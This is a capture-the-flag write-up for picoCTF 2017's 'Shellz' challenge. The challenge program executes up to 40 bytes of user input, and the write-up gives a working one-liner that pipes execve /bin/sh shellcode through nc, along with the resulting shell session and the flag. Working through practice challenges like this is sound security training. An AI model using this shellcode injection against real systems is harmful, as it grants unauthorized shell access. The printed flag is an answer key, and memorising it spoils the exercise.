# Shellz
## level 2 - binary exploitation - 55 points

### Description
> You no longer have an easy thing to call, but you have more space. Program: [shellz](./data/shellz)! [Source](./data/shellz.c). Connect on shell2017.picoctf.com:6942.

### Hints
> * There is a bunch of preexisting shellcode already out there!


### Solution

Connect via `nc`, it will prompt you a message:

```
$ nc shell2017.picoctf.com 6942
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?
Give me 40 bytes:
```

It will ask for (at most) 40 bytes of data then exit. Looking into the source we can notice something peculiar:

```c
char * stuff = (char *)mmap(NULL, AMOUNT_OF_STUFF, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
// ...
void (*func)() = (void (*)())stuff;
func();
```

Line 27 will create a function pointer to the bytes we provided, then it will be called in line 28, so we can use input to inject arbitrary [shellcode](https://en.wikipedia.org/wiki/Shellcode) to get access to shell.

I looked for a suitable shellcode (remeber the 40 bytes constraint) [here](http://shell-storm.org/shellcode/) and I chose [shellcode-752](http://shell-storm.org/shellcode/files/shellcode-752.php). To send data to `nc` we can use Python, remember we have to use `cat` to keep the shell open:

```shell
(python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"'; cat -) | nc shell2017.picoctf.com 6942
```

Once run just type normal shell commands:

```
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?
Give me 40 bytes:
ls
flag.txt
shellz
shellz_no_aslr
xinetd_wrapper.sh
cat flag.txt
4effa67d6909029fd3cc45600f024e3f
```

### Flag
```
4effa67d6909029fd3cc45600f024e3f
```